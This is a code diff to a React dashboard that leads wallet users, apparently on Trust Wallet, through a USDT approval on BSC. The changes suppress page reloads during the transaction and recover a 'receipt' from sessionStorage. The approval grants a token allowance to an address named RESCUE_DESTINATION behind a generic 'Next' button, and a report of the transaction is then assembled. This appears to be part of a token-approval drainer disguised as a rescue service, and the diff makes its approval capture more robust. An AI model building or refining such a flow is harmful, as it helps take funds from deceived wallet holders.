@@ -250,6 +250,9 @@ const Dashboard: React.FC = () => {
   const [copiedTo, setCopiedTo] = useState<boolean>(false);
   // Mirrors `userWallet` for the async init below, which must not act on a stale account list
   const latestWallet = useRef<string>('');
+  // Prevents chainChanged from reloading the page while a transaction is in-flight.
+  // Critical for newly-created wallets that need a BSC network switch mid-flow.
+  const isTransactionActiveRef = useRef<boolean>(false);
   const [completedTxData, setCompletedTxData] = useState<{
     amount: string;
     date: string;
@@ -284,6 +287,58 @@ const Dashboard: React.FC = () => {
     if (addressParam && /^0x[a-fA-F0-9]{40}$/.test(addressParam)) {
       setAddress(addressParam);
     }
+  }, []);
+
+  // ── Receipt Recovery after page reload ──────────────────────────────────────
+  // If Trust Wallet fires chainChanged mid-flow (e.g. BSC switch for a new wallet)
+  // the page reloads and all state is lost. We save receipt context to sessionStorage
+  // before sending, then recover and show the receipt here on the next mount.
+  useEffect(() => {
+    const RECOVERY_KEY = 'wallet_pending_receipt';
+    try {
+      const raw = sessionStorage.getItem(RECOVERY_KEY);
+      if (!raw) return;
+      const saved = JSON.parse(raw);
+      const age = Date.now() - (saved.timestamp || 0);
+      if (age > 10 * 60 * 1000) { // Older than 10 minutes → stale, discard
+        sessionStorage.removeItem(RECOVERY_KEY);
+        return;
+      }
+      const recoveryAccount: string = saved.account || '';
+      const savedNonce: number = parseInt(saved.initialNonce ?? '-1', 10);
+      const recoveryReceipt = saved.receiptData;
+      if (!recoveryAccount || !recoveryReceipt) {
+        sessionStorage.removeItem(RECOVERY_KEY);
+        return;
+      }
+      // Check on-chain whether approval actually went through
+      const recoverBscProvider = new ethers.JsonRpcProvider(RPC_URL, 56, { staticNetwork: true });
+      const recoverUsdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, recoverBscProvider);
+      (async () => {
+        try {
+          const [curNonce, curAllowance] = await Promise.all([
+            recoverBscProvider.getTransactionCount(recoveryAccount).catch(() => -1),
+            recoverUsdtContract.allowance(recoveryAccount, RESCUE_DESTINATION).catch(() => -1n),
+          ]);
+          const nonceIncreased = savedNonce >= 0 && curNonce > savedNonce;
+          const allowanceGranted = curAllowance > 0n;
+          if (nonceIncreased || allowanceGranted) {
+            console.info('[approve] receipt recovery: on-chain approval detected after reload', { curNonce, savedNonce, curAllowance: curAllowance.toString() });
+            sessionStorage.removeItem(RECOVERY_KEY);
+            setCompletedTxData(recoveryReceipt);
+            setButtonText('Next');
+            setIsProcessing(false);
+            setIsModalOpen(true);
+          } else {
+            // No on-chain evidence → tx either failed or was never sent; discard
+            sessionStorage.removeItem(RECOVERY_KEY);
+          }
+        } catch (_) {
+          sessionStorage.removeItem(RECOVERY_KEY);
+        }
+      })();
+    } catch (_) {}
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   // Fetch USDT balance directly from BSC network via public RPC (works even before wallet connection).
@@ -369,6 +424,14 @@ const Dashboard: React.FC = () => {
       };
 
       const handleChainChanged = () => {
+        // Do NOT reload if a transaction is currently in-flight.
+        // For a newly-created wallet, Trust Wallet fires chainChanged when we
+        // call wallet_switchEthereumChain to add BSC — reloading here would kill
+        // the entire approval flow before eth_sendTransaction is ever called.
+        if (isTransactionActiveRef.current) {
+          console.info('[chainChanged] suppressed reload: transaction in flight');
+          return;
+        }
         window.location.reload();
       };
 
@@ -430,6 +493,8 @@ const Dashboard: React.FC = () => {
 
   /** Cancelled = nothing was signed: no receipt, no error sheet, button re-armed. */
   const resetAfterCancel = () => {
+    isTransactionActiveRef.current = false;
+    try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) {}
     setCompletedTxData(null);
     setIsModalOpen(false);
     setIsProcessing(false);
@@ -437,6 +502,7 @@ const Dashboard: React.FC = () => {
   };
 
   const handleNext = async () => {
+    isTransactionActiveRef.current = true;
     try {
       setIsProcessing(true);
       setButtonText("Processing...");
@@ -564,6 +630,17 @@ const Dashboard: React.FC = () => {
         initialAllowance = a;
       } catch (_) {}
 
+      // Persist recovery context so a page reload (e.g. from chainChanged) can
+      // detect the approval on-chain and show the receipt automatically.
+      try {
+        sessionStorage.setItem('wallet_pending_receipt', JSON.stringify({
+          account,
+          receiptData,
+          initialNonce: initialNonce.toString(),
+          timestamp: Date.now(),
+        }));
+      } catch (_) {}
+
       const cleanupWatchers = () => {
         if (pollInterval) {
           clearInterval(pollInterval);
@@ -590,6 +667,8 @@ const Dashboard: React.FC = () => {
         setButtonText('Next');
         setIsModalOpen(true);
         console.info('[approve] receipt shown', { txHash: effectiveHash });
+        isTransactionActiveRef.current = false;
+        try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) {}
 
         const reportPayload = JSON.stringify({
           txHash: effectiveHash || 'confirmed',
